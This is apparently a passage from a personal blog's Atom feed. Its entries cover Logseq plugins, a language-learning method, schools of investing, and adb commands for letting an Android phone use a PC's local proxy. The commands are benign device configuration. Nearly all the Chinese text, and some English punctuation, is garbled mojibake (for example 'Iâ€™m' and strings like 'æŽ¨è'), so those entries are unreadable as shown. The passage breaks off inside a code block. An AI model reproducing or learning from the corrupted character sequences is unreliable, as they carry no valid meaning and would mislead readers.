    <content type="html"><![CDATA[<p>Recommend some Logseq plugins Iâ€™m currently using. The functions of these plugins are very practical. You can refer to my previous article <a href="https://www.usmacd.com/cn/logseq2/">Logseq Usage Summary (Two)</a> for the method of installing Logseq plugins.</p><h2 id="logseq-random-note"><a href="#logseq-random-note" class="headerlink" title="logseq-random-note"></a>logseq-random-note</h2><p><a href="https://github.com/TankCool/logseq-random-note">https://github.com/TankCool/logseq-random-note</a></p><p>A plugin for randomly browsing notes in Logseq. The fact that Logseq doesnâ€™t have a default random note feature may be an oversight, in contrast, Obsidian has a built-in â€œopen random noteâ€ Core Plugin. Regarding the benefits of randomly discovering notes, I have written a dedicated article on <a href="https://www.usmacd.com/cn/note_review/">the advantages of periodically reviewing notes</a>. In my Logseq workflow, regularly reviewing notes is an essential part, often leading to unexpected gains.</p><p>The logseq random note plugin has an issue during usage, it uses the JavaScript <code>math.random</code> function to generate random numbers, which is of low quality, causing the random note plugin to frequently access the same note. I submitted a pull request to the plugin github repository, but the original author did not merge it. If you encounter the issue I mentioned during use, you can try my modified version of the plugin <a href="https://github.com/henices/logseq-random-note">https://github.com/henices/logseq-random-note</a></p><h2 id="logseq-Banners-plugin"><a href="#logseq-Banners-plugin" class="headerlink" title="logseq Banners plugin"></a>logseq Banners plugin</h2><p><a href="https://github.com/yoyurec/logseq-banners-plugin">https://github.com/yoyurec/logseq-banners-plugin</a></p><p>Displays banners in Logseqâ€™s Journal or other pages. The banner can include Calendar, Weather, Pomodoro, and Random quote widgets, providing customization and free combination. I only use the random note feature, allowing me to see my previous notes unintentionally every day, which feels great.</p><p><img src="https://raw.githubusercontent.com/yoyurec/logseq-banners-plugin/main/screenshots/widgets-light-01.png" alt="banner plugin"></p><h2 id="logseq-page-tags-and-Hierarchy"><a href="#logseq-page-tags-and-Hierarchy" class="headerlink" title="logseq page-tags and Hierarchy"></a>logseq page-tags and Hierarchy</h2><p><a href="https://github.com/YU000jp/logseq-page-tags-and-hierarchy">https://github.com/YU000jp/logseq-page-tags-and-hierarchy</a></p><p>A plugin that visually displays Page-tags and Hierarchy in a page, without needing to scroll to the bottom of the page. Logseqâ€™s Page-tags and namespace features are not as well-known as other features. Regrettably, I couldnâ€™t find a clear explanation in Logseqâ€™s documentation.</p><p>The namespace defines the hierarchical relationship between pages, and you can see the hierarchy at the bottom of a page. The namespace has two representation methods:</p><ul><li><code>#topic/topic0/topic1</code></li><li><code>[[topic/topic0/topic1]]</code></li></ul><p>I generally use the former expression, as itâ€™s simpler. When I type <code>#topic</code>, Logseq automatically suggests <code>#topic/topic0</code> and <code>#topic/topic0/topic1</code>, which is very convenient.</p><p>Page-tags are a special property in the first block of a page, using <code>tags:: #topic</code> will make this page visible at the bottom of the <code>topic</code> page in reverse.</p><p>During actual usage, once a pageâ€™s content grows, checking Page-tags and the namespace Hierarchy requires scrolling to the bottom of the page, which is very inconvenient. This plugin was developed to solve this issue.</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-page-tags.png" alt="page-tags"></p><h2 id="logseq-assets-plus"><a href="#logseq-assets-plus" class="headerlink" title="logseq-assets-plus"></a>logseq-assets-plus</h2><p><a href="https://github.com/xyhp915/logseq-assets-plus">https://github.com/xyhp915/logseq-assets-plus</a></p><p>A plugin for conveniently inserting assets, with the shortcut <code>ctrl/cmd+Shift+o</code>. In Logseq, the method to insert an asset is to use the <code>/upload a asset</code> command, press enter, and a dialog box will pop up for you to select the file you want to save. However, to insert an existing asset into a block, you can only search by name. Logseq assets plus provides richer filtering methods.</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-asset-plus.png" alt="asset-plus"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li>Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰<a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘æ­£åœ¨ä½¿ç”¨çš„ Logseq Plugin (æ’ä»¶)</title>
    <link href="/cn/logseq_plugins/"/>
    <url>/cn/logseq_plugins/</url>
    
    <content type="html"><![CDATA[<p>æ¨èä¸€äº›æˆ‘æ­£åœ¨ä½¿ç”¨çš„ <a href="https://github.com/logseq/logseq">Logseq</a> æ’ä»¶ï¼Œè¿™äº›æ’ä»¶çš„åŠŸèƒ½éƒ½éå¸¸å®ç”¨ã€‚Logseq å®‰è£…æ’ä»¶çš„æ–¹æ³•å¯ä»¥å‚è€ƒæˆ‘ä»¥å‰å†™çš„æ–‡ç«  <a href="https://www.usmacd.com/cn/logseq2/">Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</a> ã€‚</p><h2 id="logseq-random-note"><a href="#logseq-random-note" class="headerlink" title="logseq-random-note"></a>logseq-random-note</h2><p><a href="https://github.com/TankCool/logseq-random-note">https://github.com/TankCool/logseq-random-note</a></p><p>åœ¨ Logseq ä¸­éšæœºæµè§ˆç¬”è®°çš„æ’ä»¶ã€‚Logseq æ²¡æœ‰é»˜è®¤çš„éšæœºç¬”è®°åŠŸèƒ½å¯èƒ½æ˜¯ä¸€ä¸ªå¤±è¯¯ï¼Œåè§‚ Obsidian å°±æœ‰å†…ç½® open random note çš„åŠŸèƒ½ã€‚å…³äºéšæœºå‘ç°ç¬”è®°çš„ä½œç”¨ï¼Œæˆ‘ä¸“é—¨å†™è¿‡ä¸€ç¯‡æ–‡ç«  <a href="https://www.usmacd.com/cn/note_review/">å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„</a>ã€‚åœ¨æˆ‘çš„ Logseq å·¥ä½œæµ(workflow) ä¸­ï¼Œå®šæœŸå›é¡¾ç¬”è®°æ˜¯éå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œç»å¸¸éƒ½èƒ½è·å¾—æ„æƒ³ä¸åˆ°çš„æ”¶è·ã€‚</p><p>logseq random note æ’ä»¶åœ¨ä½¿ç”¨ä¸­æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç”Ÿæˆéšæœºæ•°æ—¶ä½¿ç”¨äº† javascript math.random å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç”Ÿæˆçš„éšæœºæ•°è´¨é‡ä¸é«˜ï¼Œå¯¼è‡´ random note æ’ä»¶ç»å¸¸ä¼šè®¿é—®åŒä¸€ä¸ªç¬”è®°ã€‚æˆ‘å‘åŸä»“åº“æäº¤äº†ä¿®æ”¹åçš„æºç ï¼Œä½†æ˜¯åŸä½œè€…æ²¡æœ‰åˆå¹¶ã€‚å¦‚æœåœ¨ä½¿ç”¨çš„æ—¶å€™é‡ä¸Šæˆ‘è¯´çš„è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è¯•è¯•æˆ‘çš„ä¿®æ”¹ç‰ˆæ’ä»¶ <a href="https://github.com/henices/logseq-random-note">https://github.com/henices/logseq-random-note</a></p><h2 id="Logseq-Banners-plugin"><a href="#Logseq-Banners-plugin" class="headerlink" title="Logseq Banners plugin"></a>Logseq Banners plugin</h2><p><a href="https://github.com/yoyurec/logseq-banners-plugin">https://github.com/yoyurec/logseq-banners-plugin</a><br>åœ¨ Logseq çš„ Journal æˆ–è€…å…¶ä»–é¡µé¢æ˜¾ç¤º banner ã€‚Banner ä¸­å¯ä»¥æ·»åŠ  Calendarï¼ŒWeatherï¼ŒPomodoroï¼ŒRandom quote å°ç»„ä»¶ï¼Œæä¾›è‡ªå®šä¹‰åŠŸèƒ½ï¼Œå¯ä»¥è‡ªç”±ç»„åˆã€‚æˆ‘åªä½¿ç”¨äº† random note çš„åŠŸèƒ½ï¼Œæ¯å¤©éƒ½å¯ä»¥ä¸ç»æ„çš„çœ‹åˆ°ä»¥å‰çš„ç¬”è®°ï¼Œæ„Ÿè§‰éå¸¸ä¸é”™ã€‚</p><p><img src="https://raw.githubusercontent.com/yoyurec/logseq-banners-plugin/main/screenshots/widgets-light-01.png" alt="banner plugin"></p><h2 id="Page-tags-and-Hierarchy"><a href="#Page-tags-and-Hierarchy" class="headerlink" title="Page-tags and Hierarchy"></a>Page-tags and Hierarchy</h2><p><a href="https://github.com/YU000jp/logseq-page-tags-and-hierarchy">https://github.com/YU000jp/logseq-page-tags-and-hierarchy</a></p><p>åœ¨é¡µé¢ä¸­ç›´è§‚å¾—çœ‹è§ Page-tags å’Œ Hierarchyï¼Œä¸ç”¨æ»šåŠ¨åˆ°é¡µé¢åº•éƒ¨çš„æ’ä»¶ã€‚Logseq Page-tags å’Œ namespace ç‰¹æ€§ï¼Œå¹¶ä¸åƒå…¶ä»–ç‰¹æ€§è¢«äººä»¬ç†ŸçŸ¥ã€‚æ¯”è¾ƒé—æ†¾çš„æ˜¯æˆ‘æ²¡æœ‰åœ¨ Logseq çš„æ–‡æ¡£ä¸­æ‰¾åˆ°æ˜ç¡®çš„è¯´æ˜ã€‚</p><p>namespace å®šä¹‰äº† page ä¹‹é—´çš„å±‚çº§å…³ç³»ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªé¡µé¢çš„åº•éƒ¨çœ‹å‡ºå±‚çº§å…³ç³»ã€‚namespace æœ‰ä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼š</p><ul><li><code>#topic/topic0/topic1</code></li><li><code>[[topic/topic0/topic1]]</code></li></ul><p>æˆ‘ä¸€èˆ¬éƒ½ä½¿ç”¨å‰é¢çš„è¡¨è¾¾æ–¹å¼ï¼Œæ¯”è¾ƒç®€å•ï¼Œè¾“å…¥ <code>#topic</code> Logseq å°±ä¼šè‡ªåŠ¨æç¤º <code>#topic/topic0</code> å’Œ <code>#topic/topic0/topic1</code> éå¸¸æ–¹ä¾¿ã€‚</p><p>Page-tags æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œåœ¨ä¸€ä¸ª page çš„ç¬¬ä¸€ä¸ªblock ä½¿ç”¨ <code>tags:: #topic</code> å¯ä»¥åœ¨topic é¡µé¢åº•éƒ¨åå‘æŸ¥çœ‹åˆ°è¿™ä¸ª pageã€‚</p><p>å®é™…ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°ï¼Œä¸€æ—¦é¡µé¢çš„å†…å®¹å¤šäº†ï¼Œè¦æŸ¥çœ‹ Page-tags å’Œ namespace çš„ Hierarchy å¿…é¡»æ»šåŠ¨åˆ°é¡µé¢åº•éƒ¨éå¸¸è´¹äº‹ï¼Œè¿™ä¸ªæ’ä»¶å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œå¼€å‘çš„ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-page-tags.png" alt="page-tags"></p><h2 id="logseq-assets-plus"><a href="#logseq-assets-plus" class="headerlink" title="logseq-assets-plus"></a>logseq-assets-plus</h2><p><a href="https://github.com/xyhp915/logseq-assets-plus">https://github.com/xyhp915/logseq-assets-plus</a></p><p>æ–¹ä¾¿æ’å…¥èµ„æº asset çš„æ’ä»¶ï¼Œå¿«æ·é”®  ctrl&#x2F;cmd+Shift+O ã€‚åœ¨Logseq ä¸­æ’å…¥ asset çš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨ &#x2F;upload a asset å‘½ä»¤ï¼Œå›è½¦åä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†é€‰æ‹©ä½ è¦ä¿å­˜çš„æ–‡ä»¶å³å¯ã€‚ä½†æ˜¯è¦åœ¨ä¸€ä¸ª block ä¸­æ’å…¥ä¸€ä¸ªå·²æœ‰çš„ asset ï¼Œåªèƒ½ä½¿ç”¨åå­—æœç´¢ï¼ŒLogseq assets plus æä¾›äº†æ›´åŠ ä¸°å¯Œçš„è¿‡æ»¤æ–¹æ³•ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-asset-plus.png" alt="asset-plus"></p><h2 id="logseq-plugin-mark-map"><a href="#logseq-plugin-mark-map" class="headerlink" title="logseq-plugin-mark-map"></a>logseq-plugin-mark-map</h2><p><a href="https://github.com/vipzhicheng/logseq-plugin-mark-map">https://github.com/vipzhicheng/logseq-plugin-mark-map</a></p><p>å°†å¤§çº²ç¬”è®°å±•ç¤ºä¸ºæ€ç»´å¯¼å›¾æ’ä»¶ï¼Œè§¦å‘å¿«æ·é”® mm ã€‚å°†å¤§çº²ç¬”è®°è½¬åŒ–ä¸ºæ€ç»´å¯¼å›¾ï¼Œå¯¹å†…å®¹è®°å¿†æœ‰ä¸€äº›å¸®åŠ©ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_5.png" alt="mark-map"></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li>Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰<a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹</title>
    <link href="/cn/language_learning/"/>
    <url>/cn/language_learning/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€åˆ™è¯­è¨€å­¦ä¹ æ–¹æ³•çš„ç¬”è®°ã€‚è‹±è¯­å­¦ä¹ æ˜¯è®¸å¤šäººå…³æ³¨çš„äº‹ï¼Œè‹±è¯­ä¹‹æ‰€ä»¥é‡è¦æ˜¯å› ä¸ºå¾ˆå¤šä¿¡æ¯çš„ç¬¬ä¸€æ‰‹èµ„æ–™éƒ½æ˜¯è‹±æ–‡çš„ï¼Œåœ¨ç»´åŸºç™¾ç§‘ä¸Šéšä¾¿æŸ¥é˜…ä¸€ä¸ªè¯æ¡ï¼Œå†å¯¹æ¯”ä¸€ä¸‹ç®€ä¸­ã€ç¹ä¸­ï¼Œè‹±è¯­ï¼Œå°±ä¼šå‘ç°èµ„æ–™çš„å‡†ç¡®æ€§å’Œå®Œå–„ç¨‹åº¦éƒ½æœ‰å·®è·ã€‚åœ¨é˜…è¯»å¤–æ–‡ä¹¦ç±çš„æ—¶å€™ä¼šé‡ä¸ŠåŒæ ·çš„é—®é¢˜ï¼Œå›½å†…ç¿»è¯‘çš„ç‰ˆæœ¬æœ€å¤§çš„é—®é¢˜æ˜¯å†…å®¹ä¸å…¨ï¼Œå…¶æ¬¡æ˜¯ç¿»è¯‘è´¨é‡é—®é¢˜ã€‚</p><p>Youtube ä¸Šè®¸å¤šæˆåŠŸçš„å¤–è¯­å­¦ä¹ è€…å¼ºè°ƒcomprehensible input ï¼Œè€Œè¿™ç¯‡æ–‡ç« çš„æ–¹æ³•å’Œä¼ ç»Ÿçš„æ€è·¯è¾ƒä¸ºæ¥è¿‘ï¼Œå‘éŸ³ + è¯­æ³• + shadowing ã€‚</p><hr><h2 id="å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹"><a href="#å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹" class="headerlink" title="å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹"></a>å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹</h2><p>ä½œè€… Theia æ˜¯ä¸€ä¸ªä¼šäº”é—¨è¯­è¨€çš„å…¨çƒé’å¹´ã€‚ å¥¹åˆ†äº«äº†ä¸€ä¸ªè‡ªå·±è®¤ä¸ºæœ€æœ‰æ•ˆçš„è¯­è¨€å­¦ä¹ æ–¹æ³•ï¼š</p><ol><li>æ‰¾ä¸€ç¯‡è¯­æ–™ï¼Œç²¾è¯»ä¸€éã€‚</li><li>å°†æ‰€æœ‰çš„å•è¯ã€é‡è¦è¯­æ³•ã€è¯ç»„æ”¾å…¥ anki çº³å…¥è‡ªå·±çš„å•è¯åº“ã€‚</li><li>è·Ÿç€å½•éŸ³åå¤é˜…è¯» + shadowing (å½±å­è·Ÿè¯») ï¼Œä¹ƒè‡³èƒŒè¯µã€‚</li></ol><p>è¯­æ–™åº“çš„é€‰æ‹©ï¼Œåº”å½“æœ‰éŸ³é¢‘å’Œæ–‡æœ¬ï¼Œè¯­æ³•è¯æ±‡ç•¥é«˜äºä½ çš„æ°´å¹³ï¼Œæœ€å¥½æ˜¯è‡ªå·±æ„Ÿå…´è¶£çš„å†…å®¹ã€‚è¿™ä¸ªæ–¹æ³•åšæŒä¸€ä¸¤ç¯‡ï¼Œå°±ä¼šè¿›æ­¥æŒºå¤§ï¼Œç”¨å¾—è¶Šå¤šï¼Œè¿›æ­¥è¶Šå¤§ã€‚Theia å­¦ä¹  è‹±æ—¥è¥¿è· è¯­è¨€ï¼Œéƒ½åœ¨ç”¨è¿™ä¸ªæ–¹æ³•å­¦ä¹ ã€‚</p><p>shadowing æ˜¯ä¸€ä¸ªå¸¸è§çš„è¯­è¨€å­¦ä¹ æ–¹æ³•ï¼Œåœ¨å½•éŸ³æ’­æ”¾æ—¶ä¸çœ‹æ–‡æœ¬ï¼Œå»¶è¿Ÿ1ç§’å·¦å³çš„é€Ÿåº¦è·Ÿç€è¯´å‡ºå†…å®¹ã€‚shadowing ä¸ä½†é”»ç‚¼å¬åŠ›ï¼Œè¿˜å¯ä»¥æå‡å‘éŸ³å’Œå£è¯­ã€‚</p><h2 id="è¯­è¨€å­¦ä¹ ä¸å¯ä»¥é”™è¿‡çš„ä¸€æœ¬ä¹¦"><a href="#è¯­è¨€å­¦ä¹ ä¸å¯ä»¥é”™è¿‡çš„ä¸€æœ¬ä¹¦" class="headerlink" title="è¯­è¨€å­¦ä¹ ä¸å¯ä»¥é”™è¿‡çš„ä¸€æœ¬ä¹¦"></a>è¯­è¨€å­¦ä¹ ä¸å¯ä»¥é”™è¿‡çš„ä¸€æœ¬ä¹¦</h2><p>Theia è®¤ä¸º Fluent Forever æ˜¯è¯­è¨€çˆ±å¥½è€…ä¸å¾—ä¸è¯»çš„ä¹¦ã€‚è¿™æœ¬ä¹¦ç»™å‡ºçš„æ–¹æ³•è¦†ç›–äº†æ•´ä¸ªè¯­è¨€å­¦ä¹ ï¼Œå³ä½¿æ˜¯æœ‰å¾ˆä¸°å¯Œè¯­è¨€å­¦ä¹ å¿ƒå¾—çš„äººã€‚ç»ƒå¥½å‘éŸ³ï¼Œæ˜¯è¯­è¨€å­¦ä¹ ç¬¬ä¸€ä»¶äº‹ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€ä»¶äº‹ã€‚</p><h2 id="è¯­æ³•å­¦ä¹ ä¸ã€Œæœ‰æ•ˆè¾“å…¥ã€"><a href="#è¯­æ³•å­¦ä¹ ä¸ã€Œæœ‰æ•ˆè¾“å…¥ã€" class="headerlink" title="è¯­æ³•å­¦ä¹ ä¸ã€Œæœ‰æ•ˆè¾“å…¥ã€"></a>è¯­æ³•å­¦ä¹ ä¸ã€Œæœ‰æ•ˆè¾“å…¥ã€</h2><p>Fluent Forever ä¸­æåˆ°ä¸€ä¸ªè¯­è¨€å­¦ä¹ æ–¹æ³•ï¼Œæ°å½“åœ°å­¦ä¹ è¯­æ³• (develop a passing familiarity with grammar)ã€‚åœ¨è¿›è¡Œæœ‰æ•ˆè¾“å…¥ (comprehensible input ) ä¹‹å‰ï¼Œè®©è‡ªå·±åœ¨ä¸€å®šç¨‹åº¦ä¸Šç†Ÿæ‚‰ç›®æ ‡è¯­è¨€è¯­æ³•ï¼Œå¯ä»¥å°†å¥å­æœ‰é€»è¾‘åœ°æ‹†è§£æˆå¯ä»¥ç†è§£çš„ç‰‡æ®µï¼Œä»è€ŒåŠ å¿«è¯­è¨€å­¦ä¹ çš„é€Ÿåº¦ã€‚</p><p>å°½é‡åˆ›é€ è¯­è¨€æ²‰æµ¸ç¯å¢ƒï¼Œå¯ä»¥æ˜¯é˜…è¯»ï¼Œçœ‹ç”µå½±ï¼Œä½†æœ€æœ‰ç”¨çš„æ–¹æ³•æ˜¯çœ‹ç”µè§†å‰§ã€‚ç”µè§†å‰§å¯ä»¥ç»™äººå¸¦æ¥å¤šæ„Ÿå®˜åˆºæ¿€ï¼Œå´ä¸åƒç”µå½±æƒ…èŠ‚é‚£ä¹ˆç´§å‡‘ï¼Œè®©ä½ æ‰å…¥æƒ…èŠ‚ä¸­ã€‚<br>å­¦ä¹ æ•ˆæœï¼šæ— å­—å¹• &gt; ç›®æ ‡è¯­è¨€å­—å¹• &gt; ä¸­æ–‡å­—å¹•ã€‚</p><p>Theia è¿˜æœ‰ ã€Šä¸€ä¸ªå¤šè¯­è€…çš„ç‹¬ç™½ã€‹ç³»åˆ—æ–‡ç« å€¼å¾—é˜…è¯»ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p><p><a href="https://sspai.com/post/77311">https://sspai.com/post/77311</a><br><a href="https://sspai.com/post/77851">https://sspai.com/post/77851</a><br><a href="https://sspai.com/post/78195">https://sspai.com/post/78195</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>[1] å¦‚æœæˆ‘è¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹â€¦åŠå…¶ä»–ç¢ç¢å¿µ Theiaåœ¨è·¯ä¸Š 2024&#x2F;1&#x2F;06<br><a href="https://sspai.com/post/85611">https://sspai.com/post/85611</a></p><p>[2] comprehensible input è‹±è¯­å­¦ä¹ æ–¹æ³•<br><a href="https://www.usmacd.com/cn/learning_english/">https://www.usmacd.com/cn/learning_english/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡‘èå¸‚åœºä¸­çš„ä¸åŒæµæ´¾</title>
    <link href="/cn/investment_category/"/>
    <url>/cn/investment_category/</url>
    
    <content type="html"><![CDATA[<ul><li>ä»·å€¼æŠ•èµ„ï¼šä»·å€¼ä½ä¼°ã€ä»·å€¼æˆé•¿ (å·´è²ç‰¹)</li><li>è¶‹åŠ¿äº¤æ˜“ï¼šåˆ†æå¸‚åœºçš„æ–¹å‘åŠ¨åŠ›å¹¶å¯»æ‰¾å‚ä¸è¯¥èµ°åŠ¿çš„æ–¹æ³•çš„è¿‡ç¨‹ (ç†æŸ¥å¾·.ä¸¹å°¼æ–¯)</li><li>é‡åŒ–äº¤æ˜“ï¼šé«˜é¢‘äº¤æ˜“ã€åŠ¨é‡äº¤æ˜“ã€ç»Ÿè®¡å¥—åˆ©ç­‰  (è©¹å§†æ–¯Â·è¥¿è’™æ–¯)</li><li>å¸‚åœºåšå¼ˆï¼šä»¥å¾æ€»èˆµä¸»ä¸ºä»£è¡¨çš„æ‰“æ¿æ´¾</li><li>æŠ€æœ¯åˆ†æï¼šé€šè¿‡ç ”ç©¶å†å²äº¤æ˜“æ•°æ®ï¼ˆä¸»è¦æ˜¯ä»·æ ¼å’Œæˆäº¤é‡ï¼‰ï¼Œæ¥é¢„æµ‹æœªæ¥çš„ä»·æ ¼èµ°åŠ¿ï¼ˆå¨å»‰.æ±Ÿæ©ï¼‰</li><li>æŠ•èµ„ç­–ç•¥ï¼šETF æŒ‡æ•°æŠ•èµ„ã€ç½‘æ ¼äº¤æ˜“ã€åŸºé‡‘å®šæŠ•ï¼ŒæŠ•èµ„ç»„åˆç†è®º ç­‰</li><li>æŠ•èµ„å“²å­¦ï¼šæŠ•èµ„æ–¹æ³•å»ºç«‹äºä¸ªäººçš„é‡‘èå“²å­¦è§‚ä¸Š ï¼ˆä¹”æ²»Â·ç´¢ç½—æ–¯, æ—¢æœ‰å®è§‚æ‹©æ—¶ï¼Œåˆæœ‰è¶‹åŠ¿äº¤æ˜“ï¼ˆåèº«æ€§))</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android æ‰‹æœºä½¿ç”¨ PC ä»£ç†ä¸Šç½‘çš„æ–¹æ³•</title>
    <link href="/cn/android_use_proxy_of_pc/"/>
    <url>/cn/android_use_proxy_of_pc/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸€äº›ç‰¹æ®Šçš„æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨ Android æ‰‹æœºæˆ–è€… PC çš„çº¿è·¯è®¿é—®å¤–éƒ¨ç½‘ç»œèµ„æºï¼ŒåŒæ—¶æ²¡æœ‰æ¡ä»¶è¿æ¥ wifi ç½‘ç»œï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ Android Platform Tools çš„ adb å·¥å…·æ¥è¾¾åˆ°ç›®çš„ã€‚</p><p>Android Platform Tools çš„ä¸‹è½½åœ°å€ä¸ºï¼š<br><a href="https://developer.android.com/tools/releases/platform-tools#downloads">https://developer.android.com/tools/releases/platform-tools#downloads</a></p><h2 id="Android-æ‰‹æœºä½¿ç”¨-PC-çš„ä»£ç†ä¸Šç½‘çš„æ–¹æ³•"><a href="#Android-æ‰‹æœºä½¿ç”¨-PC-çš„ä»£ç†ä¸Šç½‘çš„æ–¹æ³•" class="headerlink" title="Android æ‰‹æœºä½¿ç”¨ PC çš„ä»£ç†ä¸Šç½‘çš„æ–¹æ³•"></a>Android æ‰‹æœºä½¿ç”¨ PC çš„ä»£ç†ä¸Šç½‘çš„æ–¹æ³•</h2><p>ç”¨ USB æ•°æ®çº¿è¿æ¥ Android æ‰‹æœºå’Œ PCï¼Œåœ¨ PC ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell settings put global http_proxy 127.0.0.1:7890<br>adb reverse tcp:7890 tcp:7890<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè®¾ç½® Android æ‰‹æœº http å…¨å±€ä»£ç†ä¸º 127.0.0.1:7890ï¼Œç„¶åå°†æ‰‹æœºçš„ 127.0.0.1:7890 è½¬å‘åˆ° PC 127.0.0.1:7890 ï¼ˆæ²¡æœ‰æ‰¾åˆ°è®¾ç½® Android ç³»ç»Ÿå…¨å±€ä½¿ç”¨ socks5 ä»£ç†çš„æ–¹æ³•ï¼‰</p><p>è®¾ç½® Android å…¨å±€ä»£ç†éœ€è¦ android.permission.WRITE_SECURE_SETTINGS æƒé™ï¼ŒColorOS éœ€è¦åœ¨å¼€å‘è€…é€‰é¡¹ä¸­å¼€å¯ ã€Œç¦æ­¢æƒé™ç›‘æ§ã€å…·ä½“æ–¹æ³•å¯ä»¥å‚è€ƒï¼š<a href="https://sspai.com/post/67110">åœ¨ ColorOS ä¸Šå… root ç©æœºï¼Œè¯·å…ˆæ‰“å¼€è¿™ä¸ªå¼€å…³</a>ï¼Œå¦‚æœæ˜¯å°ç±³æ‰‹æœºå¯èƒ½éœ€è¦åœ¨å¼€å‘è€…é€‰é¡¹ä¸­æ‰“å¼€ ã€ŒUSBè°ƒè¯•ï¼ˆå®‰å…¨è®¾ç½®ï¼‰ã€ï¼Œæˆ‘æ²¡æœ‰å°ç±³æ‰‹æœºæœªæµ‹è¯•ã€‚</p><p>å¦‚æœéœ€è¦æ¢å¤Android æ— ä»£ç†çŠ¶æ€ï¼Œéœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œä¸€å®šè¦è®°å¾—æ‰§è¡Œè¿™æ¡æ¢å¤å‘½ä»¤ï¼Œå¦åˆ™æ‰‹æœºå¯èƒ½æ— æ³•è”ç½‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell settings delete global http_proxy<br>adb shell settings delete global global_http_proxy_host<br>adb shell settings delete global global_http_proxy_port<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>adb reverse</code> å‘½ä»¤åï¼Œå¯ä»¥ä½¿ç”¨ <code>adb reverse --list</code> æŸ¥çœ‹è¿æ¥å»ºç«‹æƒ…å†µï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UsbFfs</span> tcp:<span class="hljs-number">7890</span> tcp:<span class="hljs-number">7890</span><br></code></pre></td></tr></table></figure><p>ä¸éœ€è¦ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>adb reverse --remove</code> ç§»é™¤è½¬å‘</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">adb <span class="hljs-keyword">reverse</span> <span class="hljs-comment">--remove tcp:7890</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒ adb çš„å¸®åŠ©ï¼Œæ‰§è¡Œå‘½ä»¤ <code>adb help</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">reverse</span> --<span class="hljs-keyword">list</span>           <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> <span class="hljs-built_in">reverse</span> socket connections from device<br><span class="hljs-built_in">reverse</span> [--<span 